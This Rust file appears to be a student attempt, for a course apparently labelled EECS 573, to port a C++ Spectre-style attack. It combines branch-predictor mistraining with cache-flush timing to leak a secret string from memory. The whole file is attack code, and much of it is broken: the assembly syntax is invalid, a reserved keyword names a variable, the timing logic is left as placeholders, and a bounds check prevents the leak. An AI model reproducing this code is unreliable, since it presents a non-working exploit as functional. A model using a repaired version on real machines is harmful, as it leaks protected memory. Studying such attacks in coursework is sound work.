extern crate core_affinity;
use std::thread;
use std::sync::atomic::{AtomicU64, Ordering};
use rand::seq::SliceRandom;
use rand::thread_rng;
use std::arch::asm;

const CACHE_HIT_THRESHOLD: u64 = 80;
const NUM_TRIES: u64 = 1000;
const TRAINING_LOOPS: u64 = 100;
const ATTACK_LEAP: u64 = 10;
const INBETWEEN_DELAY: u64 = 100;
const LIKELY_THRESHOLD: u64 = (0.7 * NUM_TRIES as f64) as u64;
const SECRET: &str = "EECS 573";

// Counter for high-speed timer
// Donayam's suggestion
static TIMER_COUNTER: AtomicU64 = AtomicU64::new(0);

fn rdtsc() -> u64 {
    let high: u32;
    let low: u32;
    unsafe {
        std::arch::asm::asm!("rdtsc", out("eax") low, out("edx") high);
    }
    (high as u64) << 32 | low as u64
}

fn high_speed_timer() {
    loop {
        TIMER_COUNTER.fetch_add(1, Ordering::Relaxed);
    }
}

unsafe fn clflush(addr: *const u8) {
    std::arch::asm::asm!("clflush [$0]", in(reg) addr);
}

fn init_attack() -> (Vec<bool>, Vec<u8>) {
    let mut is_attack = vec![false; TRAINING_LOOPS as usize];
    for i in (0..TRAINING_LOOPS).step_by(ATTACK_LEAP as usize) {
        is_attack[i as usize] = true;
    }

    let mut attack_pattern: Vec<u8> = (0..256).collect();
    let mut rng = thread_rng();
    attack_pattern.shuffle(&mut rng);

    (is_attack, attack_pattern)
}

fn read_memory_byte(target_idx: usize, arr1_size: usize, is_attack: Vec<bool>, arr1: &[u8], arr2: &[u8], attack_pattern: Vec<u8>) -> String {
    let mut secret = String::new();

    for try in (1..=NUM_TRIES).rev() {
        // Flush arr2 from cache memory
        for i in 0..256 {
            unsafe {
                clflush(&arr2[i * 512]);
            }
        }

        let train_idx = (try as usize) % arr1_size;
        let mut results = [0; 256];

        for i in (0..TRAINING_LOOPS).rev() {
            // Flush arr1_size from cache memory
            unsafe {
                clflush(&arr1_size as *const usize as *const u8);
            }

            // Add in-between delay cycles
            for _ in 0..INBETWEEN_DELAY {
                // You can implement a delay mechanism here
            }

            let idx = if is_attack[i as usize] {
                target_idx
            } else {
                train_idx
            };

            // Call the victim function with the training_x (to mistrain branch predictor) or target_x (to attack the SECRET address)
            fetch_function(&arr1, &arr2, idx, &mut results);

            // Implement the timing attack logic here to measure cache access times for each character and update the `results` array
        }
        // Calculate the most likely character based on the results array and push it into the secret string
        let mut most_likely_char = '?';
        for i in (0..256).rev() {
            let curr_char = attack_pattern[i as usize];
            if u64::from(results[curr_char as usize]) >= LIKELY_THRESHOLD {
                if curr_char >= 31 && curr_char <= 127 {
                    most_likely_char = curr_char as char;
                    break;
                }
            }
        }
        secret.push(most_likely_char as char);
    }

    secret
}

fn fetch_function(arr1: &[u8], arr2: &[u8], idx: usize, results: &mut [u32; 256]) {
    // This function simulates the behavior of the C++ `fetch_function`.
    // It returns values from the shared memory, based on the `idx`.

    if idx < arr1.len() {
        // Ensure the index is within bounds of arr1_size
        let arr1_idx = arr1[idx] as usize;
        if arr1_idx < arr2.len() / 512 {
            // Calculate the index for arr2 based on arr1
            let arr2_idx = arr1_idx * 512;
            
            // Simulate cache access time measurement (you may need to adjust this)
            let mut time1: u64;
            let mut time2: u64;
            let junk: u64 = 0;
            
            unsafe {
                asm!(
                    "lfence",
                    "rdtscp",
                    "mov {}, rax",
                    "clflush [$0]",
                    "rdtscp",
                    "mov {}, rax",
                    "lfence",
                    out(reg) time1 => _,
                    in(reg) arr2_idx => _,
                    out(reg) junk => _,
                    out(reg) time2 => _,
                );
            }
            
            if time2 - time1 <= CACHE_HIT_THRESHOLD {
                // Cache hit, update the results
                results[arr2[arr2_idx] as usize] += 1;
            }
        }
    }
}

fn main() {
    // Set the CPU affinity for the main thread
    core_affinity::set_for_current(core_affinity::get(core_affinity::CpuSet::new(0)).unwrap());

    // Create a separate thread for high-speed timer
    let timer_thread = thread::spawn(|| high_speed_timer());

    // This is where you would set up shared memory for arr1 and arr2, as in the C++ code.
    // You'll need to replace these placeholders with actual memory setup.
    let arr1 = [16, 93, 45, 96, 4, 8, 41, 203, 15, 49, 56, 59, 62, 97, 112, 186];
    let arr2 = [0; 256 * 512]; // Placeholder, initialize with appropriate values

    let arr1_size = arr1.len();
    let target_idx = SECRET.as_ptr() as usize - arr1.as_ptr() as usize;
    let (is_attack, attack_pattern) = init_attack();
    let guessed_secret = read_memory_byte(target_idx, arr1_size, is_attack, &arr1, &arr2, attack_pattern);

    println!("THE GUESSED SECRET IS :: {}", guessed_secret);

    // Terminate the timer thread
    timer_thread.join().unwrap();
}